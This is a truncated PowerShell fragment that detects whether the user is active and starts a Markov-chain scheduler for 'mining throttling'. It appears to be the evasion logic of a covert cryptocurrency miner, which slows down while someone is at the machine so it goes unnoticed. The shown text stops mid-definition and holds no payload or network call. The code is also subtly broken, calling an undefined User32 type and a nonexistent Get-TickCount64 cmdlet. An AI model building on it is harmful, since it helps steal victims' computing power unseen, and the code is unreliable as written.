# Function: Detect active user input (keyboard/mouse)
function IsUserActive {
    $lastInput = [User32]::GetLastInputInfo()
    $idleTime = (Get-TickCount64) - $lastInput
    return ($idleTime -lt 60000) # Active if input within last 60 seconds
}

# Adaptive Markov Chain-based Scheduler for Mining Throttling
$states = @("LowLoad", "MediumLoad", "HighLoad")
$transitionMatrix = @{
    "LowLoad" = @{ "LowLoad"=0.6; "MediumLoad"=0.3; "HighLoad"=0.1 }
    "MediumLoad" = @{ "LowLoad"=0.2; "MediumLoad"=0.5; "HighLoad"=0.3 }
    "HighLoad" = @{ "LowLoad"=0.1; "MediumLoad"=0.3; "HighLoad"=0.6 }
